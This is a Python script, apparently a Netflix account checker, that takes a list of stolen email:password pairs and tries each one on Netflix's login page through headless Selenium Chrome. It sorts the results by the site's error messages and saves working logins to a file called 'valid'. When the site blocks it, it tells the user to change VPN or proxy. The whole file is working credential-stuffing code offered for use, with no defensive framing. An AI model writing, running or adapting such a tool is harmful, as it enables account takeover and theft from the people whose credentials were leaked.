import time
import requests
from header import title
from countries import find_IP
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

counter = 0
user =[]
passw =[]
clear_page = 0
details = [find_IP()[0], find_IP()[1], find_IP()[2]]

title()

print("\n\033[38;5;226mCurrent IP {} : {} | Fetching {} accounts\n".format(details[0], details[1], details[2]))

try:
	with open('netflix','r') as net:
		for line in net.readlines():
			if details[2] in line:
				user.append(line.split(":")[0])
				passw.append(line.split(":")[1].split(" | ")[0])
except FileNotFoundError:
	print("No combo-list found.\nAdd one, and name it 'netflix' before starting the program.\nEnding.\n")
	exit()
	
net.close()

page = "https://www.netflix.com/login"
request = requests.get(page)

while counter < len(user):

	if clear_page > 10:
		title()
		print("\n\033[38;5;226mCurrent IP {} : {} | Fetching {} accounts\n".format(details[0], details[1], details[2]))
		clear_page = 0

	if request.status_code == 403:
		print("\033[38;5;226mToo many requests:\033[38;5;196m Access Denied (change vpn/proxy)")
		break
	else:
		print("\033[38;5;226mConnection Status:\033[38;5;46m OK | ",end='')
		browser_options = Options()
		browser_options.add_argument ={'user-agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36'}
		browser_options.headless = True
		browser = webdriver.Chrome(options = browser_options)
		browser.set_window_size(300,400)
		browser.get(page)
		time.sleep(0.4)
		login = browser.find_element(By.XPATH, '//*[@id="id_userLoginId"]')
		password = browser.find_element(By.XPATH, '//*[@id="id_password"]')
		button = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
		login.send_keys(user[counter])
		time.sleep(0.2)
		password.send_keys(passw[counter])
		time.sleep(0.2)
		button.click()
		time.sleep(2)
		print("\033[38;5;226m Combo: {}:{} |\033[38;5;226m Result = ".format(user[counter], passw[counter]),end="")
		if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]'):
			login_error = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]').text
			if "Sorry, we can't find an account with this email address." in login_error:
				print("\033[38;5;196m Invalid Email")

			if "Incorrect password" in login_error:
				print("\033[38;5;196m Invalid Password")

		if browser.find_elements(By.XPATH, '//*[@id="formstart"]/button/span[1]'):
			print("\033[38;5;196m Account Cancelled")

		if browser.find_elements(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[1]/div[1]/div[2]/div/div/h1'):
			print("\033[38;5;46mValid Account - Stored")
			with open('valid','a') as valid:
				valid.write("{}:{}\n".format(user[counter],passw[counter]))
			
		time.sleep(1)
		counter += 1
		clear_page += 1
		browser.close()

